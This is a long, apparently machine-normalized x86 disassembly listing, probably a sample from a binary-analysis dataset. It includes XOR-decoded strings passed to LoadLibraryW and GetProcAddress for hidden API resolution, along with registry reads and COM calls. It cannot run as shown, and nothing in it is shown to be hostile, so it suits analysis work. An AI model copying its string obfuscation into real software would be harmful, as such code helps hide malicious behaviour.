lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_1002f2f7
add esp 0x50
or edi eax
lea eax [ ebx + 0x3c ]
push eax
push 0x14
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_1002f2f7
or edi eax
lea eax [ ebx + 0x40 ]
push eax
push 0x16
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_1002f2f7
or edi eax
lea eax [ ebx + 0x44 ]
push eax
push 0x17
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_1002f2f7
or edi eax
lea eax [ ebx + 0x48 ]
push eax
push 0x50
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_1002f2f7
add esp 0x50
or edi eax
lea eax [ ebx + 0x4c ]
push eax
push 0x51
push esi
lea eax [ ebp - 0x10 ]
push 0x2
push eax
call sub_1002f2f7
add esp 0x14
or eax edi
je r-xdata
push ebx
call sub_10020a90
push [ ebp - 0x8 ]
call sub_10020a90
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ esi + 0xb8 ] eax
mov eax [ ebp - 0x8 ]
mov [ esi + 0xb0 ] eax
mov [ esi + 0xbc ] ebx
xor eax eax
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x1c ]
jmp r-xdata
push ebx
call sub_10009ef2
push ebx
call sub_10020a90
push [ ebp - 0x8 ]
call sub_10020a90
push [ ebp - 0x4 ]
call sub_10020a90
add esp 0x10
jmp r-xdata
pop ecx
jmp r-xdata
push [ esi + 0xbc ]
call sub_10020a90
push [ esi + 0xb0 ]
call sub_10020a90
pop ecx
pop ecx
cmp [ eax ] 0x0
jne r-xdata
mov cl [ eax ]
cmp cl 0x30
jl r-xdata
jmp r-xdata
cmp cl 0x3b
jne r-xdata
cmp cl 0x39
jg r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xbc ]
mov ecx [ ecx ]
mov [ ebx ] ecx
mov ecx [ eax + 0xbc ]
mov ecx [ ecx + 0x4 ]
mov esi [ ebp + 0x8 ]
mov [ ebx + 0x4 ] ecx
mov ecx [ eax + 0xbc ]
mov ecx [ ecx + 0x8 ]
mov [ ebx + 0x8 ] ecx
mov ecx [ eax + 0xbc ]
mov ecx [ ecx + 0x30 ]
mov [ ebx + 0x30 ] ecx
mov eax [ eax + 0xbc ]
mov eax [ eax + 0x34 ]
mov ecx [ ebp - 0x8 ]
mov [ ebx + 0x34 ] eax
xor eax eax
inc eax
xor edi edi
mov [ ecx ] eax
cmp [ ebp - 0x4 ] edi
je r-xdata
inc eax
mov esi eax
sub cl 0x30
mov [ eax ] cl
mov cl [ esi + 0x1 ]
mov [ esi ] cl
inc esi
cmp [ esi ] 0x0
jne r-xdata
jmp r-xdata
sub_1003d2a1
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
dec [ rw-data ]
call [ EncodePointer@IAT ]
mov ecx [ rw-data ]
mov [ ecx * 4 + rw-data ] eax
pop ebp
retn
pop ebp
jmp sub_1000967a
sub_1003d2e0
push ebp
mov ebp esp
mov eax 0x8378
call sub_100794a0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
cmp [ esi + 0x8 ] 0x0
jne r-xdata
call sub_1002ec30
test eax eax
je r-xdata
mov eax 0x1
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
xor eax eax
push 0x831c
push eax
lea ecx [ ebp - 0x8376 ]
push ecx
mov [ ebp - 0x8378 ] ax
call sub_10078970
add esp 0xc
cmp [ esi + 0x90 ] 0x0
jne r-xdata
lea edx [ ebp - 0x44 ]
mov eax 0xaf
call sub_1001bb80
mov eax 0x2
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x90 ]
test eax eax
jne r-xdata
cmp [ esi + 0x84 ] 0x8
lea eax [ esi + 0x70 ]
jb r-xdata
push edi
push 0x1
push eax
call [ GetProcAddress@IAT ]
mov edi eax
test edi edi
jne r-xdata
lea edx [ ebp - 0x54 ]
mov eax 0x12c
call sub_1001bb80
mov eax 0x3
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push eax
call [ LoadLibraryW@IAT ]
mov [ esi + 0x90 ] eax
mov eax [ eax ]
push esi
lea eax [ ebp - 0x8378 ]
call sub_1004a080
lea edx [ ebp - 0x28 ]
mov eax 0xb5
call sub_1001bb80
lea edx [ ebp - 0x30 ]
mov eax 0xd
call sub_1001bb80
lea edx [ ebp - 0x8378 ]
push edx
call edi
lea ecx [ esi + 0x94 ]
lea edi [ esi + 0xb4 ]
mov [ esi + 0x50 ] eax
call sub_1002ba80
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
xor eax eax
pop esi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x58 ]
mov eax 0xee
call sub_1001bb80
lea eax [ edi + 0x4 ]
pop edi
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_1003d450
push ebp
mov ebp esp
sub esp 0x38
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x34 ] ebx
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x38 ] ebx
mov ebx [ ebp + 0x20 ]
push ebx
mov ebx [ ebp + 0x1c ]
push ebx
mov ebx [ ebp - 0x38 ]
push ebx
mov ebx [ ebp - 0x34 ]
push ebx
push edi
push ecx
push eax
mov eax [ ebp + 0x8 ]
push eax
push esi
call sub_10004ed0
xor ebx ebx
mov [ esi ] r--data
mov [ esi + 0x2c0 ] ebx
xor ecx ecx
mov [ esi + 0x2d8 ] 0x7
mov [ esi + 0x2d4 ] ebx
mov [ esi + 0x2c4 ] cx
mov [ esi + 0x2e4 ] bl
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffa0
and edx 0xff
mov [ ebp + eax * 2 - 0x30 ] dx
inc eax
cmp eax 0xa
jb r-xdata
lea ecx [ ebp - 0x30 ]
xor eax eax
push ecx
mov [ ebp - 0x1c ] ax
call [ LoadLibraryW@IAT ]
mov [ ebp - 0x34 ] eax
mov [ esi + 0x2c0 ] eax
cmp eax ebx
je r-xdata
mov eax esi
mov edi [ r--data ]
xor dl dl
xor ecx ecx
mov al [ ecx + edi ]
xor al dl
xor al 0x60
inc dl
mov [ ebp + ecx - 0x18 ] al
movzx ecx dl
cmp ecx 0x12
jb r-xdata
mov edx [ ebp - 0x34 ]
lea ecx [ ebp - 0x18 ]
push ecx
push edx
mov [ ebp - 0x6 ] bl
call [ GetProcAddress@IAT ]
mov [ esi + 0x2e0 ] eax
cmp eax ebx
mov eax esi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x1c
pop edi
mov [ esi + 0x2e4 ] 0x1
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x1c
sub_1003d580
push ebp
mov ebp esp
push 0xffffffff
push sub_100810eb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor ebx ebx
push ebx
push ebx
push 0x1
push ebx
mov [ ebp - 0x320 ] ebx
call [ CreateEventW@IAT ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x334 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push ebx
mov [ ebp - 0x330 ] eax
lea eax [ ebp - 0x334 ]
push eax
push sub_10007530
push ebx
push ebx
mov [ ebp - 0x32c ] ecx
mov [ ebp - 0x328 ] edx
mov [ ebp - 0x324 ] ebx
call sub_10011407
mov edi [ CloseHandle@IAT ]
add esp 0x18
push eax
call edi
mov ecx [ ebp - 0x334 ]
push 0xffffffff
push ecx
call [ WaitForSingleObject@IAT ]
mov edx [ ebp - 0x334 ]
push edx
call edi
mov ecx [ ebp - 0x324 ]
cmp ecx ebx
je r-xdata
lea edx [ ebp - 0x7c ]
mov eax 0x86
call sub_1001bb80
lea edx [ ebp - 0xf4 ]
mov eax 0x28
call sub_1001bb80
lea edx [ ebp - 0x31c ]
push edx
push 0x1
push ebx
lea eax [ ebp - 0xf4 ]
push eax
push 0x80000001
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x318 ] ax
mov eax ecx
mov [ ebp - 0x304 ] 0x7
mov [ ebp - 0x308 ] ebx
lea edi [ eax + 0x2 ]
lea esp [ esp ]
xor eax eax
movzx edx ax
mov eax edx
shl edx 0x10
or eax edx
mov ecx 0x82
lea edi [ ebp - 0x2fc ]
[ edi ]
lea edx [ ebp - 0x28 ]
mov eax 0x9a
mov [ ebp - 0x320 ] 0x206
call sub_1001bb80
lea eax [ ebp - 0x320 ]
push eax
mov eax [ ebp - 0x31c ]
lea ecx [ ebp - 0x2fc ]
push ecx
push ebx
push ebx
push edx
push eax
call [ RegQueryValueExW@IAT ]
test eax eax
je r-xdata
xor ecx ecx
lea eax [ ebp - 0x7c ]
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
mov [ esi ] cx
lea edx [ eax + 0x2 ]
lea esp [ esp ]
mov dx [ eax ]
add eax 0x2
cmp dx bx
jne r-xdata
sub eax edi
sar eax 0x1
push eax
push ecx
lea ecx [ ebp - 0x318 ]
call sub_1005e3c0
mov [ ebp - 0x4 ] ebx
mov ecx [ ebp - 0x324 ]
push ecx
call [ SysFreeString@IAT ]
lea eax [ ebp - 0x318 ]
xor edx edx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] ebx
push eax
mov ecx esi
mov [ esi ] dx
call sub_10051390
cmp [ ebp - 0x304 ] 0x8
jb r-xdata
mov eax [ ebp - 0x31c ]
push eax
call [ RegCloseKey@IAT ]
lea ecx [ ebp - 0x2fc ]
push ecx
mov ecx [ ebp - 0x31c ]
push ecx
call [ RegCloseKey@IAT ]
lea edx [ ebp - 0x7c ]
push edx
jmp r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx bx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea edx [ ebp - 0x7c ]
push edx
mov ecx esi
call sub_1005e3c0
jmp r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x318 ]
push ecx
call sub_10065045
add esp 0x4
jmp r-xdata
mov ecx esi
call sub_1004a800
sub_1003d7d0
mov edx [ ecx + 0x20 ]
push esi
mov esi [ edx ]
test esi esi
jne r-xdata
push ebx
push edi
mov edi [ ecx + 0x30 ]
mov ebx [ edi ]
mov eax esi
add ebx eax
cmp eax ebx
jae r-xdata
or eax 0xffffffff
pop esi
retn
test [ ecx + 0x40 ] 0x4
jne r-xdata
movzx eax [ esi ]
pop edi
pop ebx
pop esi
retn
pop edi
pop ebx
or eax 0xffffffff
pop esi
retn
mov eax [ ecx + 0x24 ]
mov eax [ eax ]
test eax eax
je r-xdata
cmp eax esi
ja r-xdata
cmp [ ecx + 0x3c ] eax
jae r-xdata
cmp [ ecx + 0x3c ] esi
jbe r-xdata
mov eax [ ecx + 0x3c ]
mov edx [ edx ]
sub eax edx
mov [ edi ] eax
mov ecx [ ecx + 0x20 ]
mov eax [ ecx ]
movzx eax [ eax ]
pop edi
pop ebx
pop esi
retn
mov [ ecx + 0x3c ] eax
sub_1003d831
mov edi edi
push ebp
mov ebp esp
sub esp 0x54
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x44 ] 0x0
and [ ebp - 0x48 ] 0x0
push esi
mov esi [ ebp + 0x20 ]
push edi
mov edi [ ebp + 0x8 ]
lea edx [ ebp - 0x44 ]
push edx
lea edx [ ebp - 0x48 ]
push edx
push eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x40 ]
push eax
push ecx
call sub_1004cd88
add esp 0x18
push eax
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call sub_10038ea0
fstp [ ebp - 0x54 ]
mov eax [ ebp - 0x48 ]
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_10060ea7
test al al
je r-xdata
fld [ ebp - 0x54 ]
shl eax 0x2
push eax
push ecx
push ecx
fstp [ esp ]
call sub_10035b1e
fstp [ ebp - 0x54 ]
add esp 0xc
lea eax [ ebp - 0x40 ]
cmp [ ebp - 0x4c ] eax
je r-xdata
or [ esi ] 0x1
or [ esi ] 0x2
cmp [ ebp - 0x44 ] 0x0
jne r-xdata
fld [ ebp - 0x54 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ edi + 0x4 ] eax
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn 0x20
sub_1003d90f
push 0x14
mov eax sub_1007e60b
call sub_10050d0f
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100067d1
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007a60
mov ecx [ ebp + 0x8 ]
push eax
call sub_100033a0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1002470e
mov eax edi
call sub_1001a1b3
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10035f61
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_1001c4b0
push edi
call sub_10009b69
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_10036aac
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002050e
sub_1003d9ac
push 0xc
push r--data
call sub_10078b50
call sub_10050dd5
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_10078071
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1003d9e2
mov eax [ ebp - 0x1c ]
call sub_10078b95
retn
sub_1003d9e8
push 0x14
mov eax sub_1007e60b
call sub_10050d0f
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100067d1
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007a60
mov ecx [ ebp + 0x8 ]
push eax
call sub_100033a0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1002470e
mov eax edi
call sub_1001a1b3
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1004488a
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_1001c4b0
push edi
call sub_10009b69
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_10036aac
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002050e
sub_1003da90
push ebp
mov ebp esp
sub esp 0x224
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
push ebx
xor ebx ebx
mov [ ebp - 0x220 ] eax
push esi
mov [ ebp - 0x218 ] ebx
xor eax eax
mov edi edi
movsx edx [ eax + ecx ]
xor edx eax
xor edx 0xff86
and edx 0xff
mov [ ebp + eax * 2 - 0x18 ] dx
inc eax
cmp eax 0x6
jb r-xdata
lea ecx [ ebp - 0x218 ]
push ecx
lea edx [ ebp - 0x18 ]
xor eax eax
push edx
mov esi edi
mov [ ebp - 0xc ] ax
call sub_100145e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x1d4 ]
mov eax 0xc3
mov [ ebp - 0x214 ] ebx
call sub_1000a6f0
lea eax [ ebp - 0x214 ]
push eax
mov ecx edx
push ecx
call sub_100145e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x94 ]
mov eax 0x74
call sub_1000a6f0
mov ebx 0x1
jmp r-xdata
lea edx [ ebp - 0x110 ]
mov eax 0x8a
mov [ ebp - 0x1e0 ] ebx
call sub_1000a6f0
lea edx [ ebp - 0x1e0 ]
push edx
lea eax [ ebp - 0x110 ]
push eax
call sub_100145e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xa4 ]
mov eax 0xcf
call sub_1000a6f0
mov ebx 0x2
jmp r-xdata
mov edx [ ebp - 0x218 ]
mov esi [ SysFreeString@IAT ]
push edx
call esi
mov eax [ ebp - 0x214 ]
push eax
call esi
mov ecx [ ebp - 0x1e0 ]
push ecx
call esi
mov edx [ ebp - 0x200 ]
push edx
call esi
mov eax [ ebp - 0x1e8 ]
push eax
call esi
mov ecx [ ebp - 0x210 ]
push ecx
call esi
mov edx [ ebp - 0x1f0 ]
push edx
call esi
mov eax [ ebp - 0x208 ]
push eax
call esi
mov ecx [ ebp - 0x1f8 ]
push ecx
call esi
mov edx [ ebp - 0x20c ]
push edx
call esi
mov eax [ ebp - 0x1dc ]
push eax
call esi
mov ecx [ ebp - 0x1e4 ]
push ecx
call esi
mov edx [ ebp - 0x1ec ]
push edx
call esi
mov eax [ ebp - 0x1f4 ]
push eax
call esi
mov ecx [ ebp - 0x1fc ]
push ecx
call esi
mov edx [ ebp - 0x204 ]
push edx
call esi
mov ecx [ ebp - 0x8 ]
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x160 ]
mov eax 0x72
mov [ ebp - 0x200 ] ebx
call sub_1000a6f0
lea ecx [ ebp - 0x200 ]
push ecx
push edx
call sub_100145e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x9c ]
mov eax 0xfb
call sub_1000a6f0
lea edx [ ebp - 0xd4 ]
mov eax 0x13
mov [ ebp - 0x1e8 ] ebx
call sub_1000a6f0
lea eax [ ebp - 0x1e8 ]
push eax
mov ecx edx
push ecx
call sub_100145e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x9c ]
mov eax 0xe3
call sub_1000a6f0
lea edx [ ebp - 0xe8 ]
mov eax 0x71
mov [ ebp - 0x210 ] ebx
call sub_1000a6f0
lea edx [ ebp - 0x210 ]
push edx
lea eax [ ebp - 0xe8 ]
push eax
call sub_100145e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xa4 ]
mov eax 0x63
call sub_1000a6f0
lea edx [ ebp - 0x30 ]
mov eax 0xcc
mov [ ebp - 0x1f0 ] ebx
call sub_1000a6f0
lea ecx [ ebp - 0x1f0 ]
push ecx
push edx
call sub_100145e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x94 ]
mov eax 0x46
call sub_1000a6f0
mov ebx 0x4
jmp r-xdata
lea edx [ ebp - 0xb4 ]
mov eax 0x25
mov [ ebp - 0x208 ] ebx
call sub_1000a6f0
lea eax [ ebp - 0x208 ]
push eax
mov ecx edx
push ecx
call sub_100145e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x94 ]
mov eax 0x5f
call sub_1000a6f0
lea edx [ ebp - 0x138 ]
mov eax 0x14
mov [ ebp - 0x1f8 ] ebx
call sub_1000a6f0
lea edx [ ebp - 0x1f8 ]
push edx
lea eax [ ebp - 0x138 ]
push eax
call sub_100145e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x94 ]
mov eax 0xe8
call sub_1000a6f0
mov ebx 0x5
jmp r-xdata
lea edx [ ebp - 0x188 ]
mov eax 0x109
mov [ ebp - 0x1d8 ] ebx
call sub_1000a6f0
lea ecx [ ebp - 0x1d8 ]
push ecx
push edx
call sub_100145e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x9c ]
mov eax 0xdd
call sub_1000a6f0
mov ebx 0x6
jmp r-xdata
lea edx [ ebp - 0x174 ]
mov eax 0x8b
mov [ ebp - 0x20c ] ebx
call sub_1000a6f0
lea eax [ ebp - 0x20c ]
push eax
mov ecx edx
push ecx
call sub_100145e0
add esp 0x8
test eax eax
je r-xdata
mov [ ebp - 0x1d8 ] r--data
lea edx [ ebp - 0x124 ]
mov eax 0xe2
mov [ ebp - 0x1dc ] ebx
call sub_1000a6f0
lea edx [ ebp - 0x1dc ]
push edx
lea eax [ ebp - 0x124 ]
push eax
call sub_100145e0
lea edx [ ebp - 0xc4 ]
mov eax 0xf8
mov [ ebp - 0x1e4 ] ebx
call sub_1000a6f0
lea ecx [ ebp - 0x1e4 ]
push ecx
push edx
call sub_100145e0
lea edx [ ebp - 0x1b8 ]
mov eax 0x85
mov [ ebp - 0x1ec ] ebx
call sub_1000a6f0
lea eax [ ebp - 0x1ec ]
push eax
mov ecx edx
push ecx
call sub_100145e0
add esp 0x18
test eax eax
je r-xdata
lea edx [ ebp - 0x9c ]
mov eax 0x64
call sub_1000a6f0
lea edx [ ebp - 0x14c ]
mov eax 0xfc
mov [ ebp - 0x1f4 ] ebx
mov [ ebp - 0x204 ] ebx
mov [ ebp - 0x21c ] ebx
mov [ ebp - 0x1fc ] ebx
call sub_1000a6f0
lea edx [ ebp - 0x1f4 ]
push edx
lea eax [ ebp - 0x14c ]
push eax
call sub_100145e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xa4 ]
mov eax 0xe0
call sub_1000a6f0
lea edx [ ebp - 0x1a0 ]
mov eax 0x3
call sub_1000a6f0
lea ecx [ ebp - 0x204 ]
push ecx
push edx
call sub_100145e0
add esp 0x8
test eax eax
je r-xdata
mov eax 0xd7
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax 0xaa
call sub_1000a6f0
lea eax [ ebp - 0x21c ]
push eax
mov ecx edx
push ecx
call sub_100145e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0xa4 ]
mov eax 0x103
call sub_1000a6f0
lea edx [ ebp - 0x9c ]
call sub_1000a6f0
lea edx [ ebp - 0xfc ]
mov eax 0x1e
call sub_1000a6f0
lea edx [ ebp - 0x1fc ]
push edx
lea eax [ ebp - 0xfc ]
push eax
call sub_100145e0
add esp 0x8
test eax eax
je r-xdata
lea edx [ ebp - 0x94 ]
mov eax 0x75
call sub_1000a6f0
xor eax eax
mov ecx [ ebp - 0x21c ]
mov edx [ ebp - 0x204 ]
push ecx
mov ecx [ ebp - 0x1fc ]
push edx
mov edx [ ebp - 0x1f4 ]
push ecx
mov ecx [ ebp - 0x1ec ]
push edx
mov edx [ ebp - 0x1e4 ]
push ecx
mov ecx [ ebp - 0x1dc ]
push edx
mov edx [ ebp - 0x1d8 ]
push ecx
mov ecx [ ebp - 0x20c ]
push edx
mov edx [ ebp - 0x1f8 ]
push ecx
mov ecx [ ebp - 0x208 ]
push edx
mov edx [ ebp - 0x1f0 ]
push ecx
mov ecx [ ebp - 0x210 ]
push edx
mov edx [ ebp - 0x1e8 ]
push ecx
mov ecx [ ebp - 0x214 ]
push edx
mov edx [ ebp - 0x218 ]
push ecx
mov ecx [ ebp - 0x1e0 ]
push edx
mov edx [ ebp - 0x200 ]
mov esi eax
call sub_1000b040
jmp r-xdata
push 0x58
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
mov eax 0x59
lea edx [ ebp - 0x7c ]
mov eax 0xc1
call sub_1000a6f0
mov ecx [ ebp - 0x220 ]
mov [ ecx ] eax
push edi
mov ecx eax
call sub_1003a0e0
test eax eax
je r-xdata
sub_1003e080
push ebp
mov ebp esp
sub esp 0x80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
push edi
xor edi edi
mov [ ebp - 0x80 ] edi
xor eax eax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x7d
and edx 0xff
mov [ ebp + eax * 2 - 0x2c ] dx
inc eax
cmp eax 0xd
jb r-xdata
xor eax eax
lea edx [ ebp - 0x80 ]
push edx
mov [ ebp - 0x12 ] ax
mov eax [ esi + 0x1c ]
mov ecx [ eax ]
lea edx [ ebp - 0x2c ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
je r-xdata
mov eax [ ebp - 0x80 ]
lea edx [ ebp - 0x7c ]
mov [ ebp - 0x7c ] edi
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x44 ]
call eax
test eax eax
jns r-xdata
mov eax 0x1
pop edi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x40 ]
mov eax 0x2
mov [ ebp - 0x78 ] edi
call sub_1000a6f0
mov eax [ ebp - 0x7c ]
mov ecx [ eax ]
lea edx [ ebp - 0x78 ]
push edx
lea edx [ ebp - 0x40 ]
push edx
push eax
mov eax [ ecx + 0x1c ]
call eax
mov eax [ ebp - 0x78 ]
mov edx [ esi + 0x120 ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x6c ]
call eax
lea edx [ ebp - 0x10 ]
mov eax 0x9a
mov [ ebp - 0x78 ] edi
call sub_1000a6f0
mov eax [ ebp - 0x7c ]
mov ecx [ eax ]
lea edx [ ebp - 0x78 ]
push edx
lea edx [ ebp - 0x10 ]
push edx
push eax
mov eax [ ecx + 0x1c ]
call eax
mov eax [ ebp - 0x78 ]
mov edx [ esi + 0x124 ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x6c ]
call eax
lea edx [ ebp - 0x74 ]
mov eax 0x12e
call sub_1000a6f0
jmp r-xdata
mov eax [ ebp - 0x80 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
xor eax eax
pop edi
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
mov [ ebp - 0x7c ] edi
mov eax [ ebp - 0x7c ]
cmp eax edi
je r-xdata
sub_1003e1ac
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_1003e1e0
push ebp
mov ebp esp
push 0xffffffff
push sub_10082521
mov eax [ fs : 0x0 ]
push eax
sub esp 0x26c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x144
xor edi edi
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x278 ] eax
mov [ ebp - 0x4 ] edi
cmp eax edi
je r-xdata
xor eax eax
push eax
call sub_100601f0
jmp r-xdata
push 0x208
lea ecx [ ebp - 0x260 ]
push edi
push ecx
call sub_10078970
add esp 0xc
lea ecx [ ebp - 0x260 ]
call sub_10044b20
test eax eax
je r-xdata
mov [ ebp - 0x4 ] ebx
mov esi [ ebp - 0x264 ]
cmp esi edi
je r-xdata
or ebx 0xffffffff
mov [ ebp - 0x4 ] ebx
push eax
lea ecx [ ebp - 0x268 ]
mov [ ebp - 0x268 ] edi
mov [ ebp - 0x264 ] edi
call sub_10028710
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x268 ] edi
jne r-xdata
push 0x1
call sub_1005ac7e
add esp 0x4
push eax
lea ecx [ ebp - 0x270 ]
mov [ ebp - 0x270 ] edi
mov [ ebp - 0x26c ] edi
call sub_100655d0
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x270 ] edi
jne r-xdata
mov [ ebp - 0x4 ] ebx
mov esi [ ebp - 0x264 ]
cmp esi edi
je r-xdata
mov eax 0x1
jmp r-xdata
lea eax [ esi + 0x4 ]
mov ecx ebx
[ eax ] ecx
jne r-xdata
lea ecx [ ebp - 0x260 ]
push ecx
lea esi [ ebp - 0x268 ]
call sub_10031da0
test eax eax
je r-xdata
lea eax [ ebp - 0x270 ]
mov [ ebp - 0x4 ] 0x1
call sub_100260d0
lea eax [ ebp - 0x268 ]
mov [ ebp - 0x4 ] ebx
call sub_100260d0
mov eax 0x3
jmp r-xdata
mov eax 0x2
jmp r-xdata
lea edx [ esi + 0x4 ]
mov eax ebx
[ edx ] eax
jne r-xdata
mov ecx [ ebp - 0xc ]
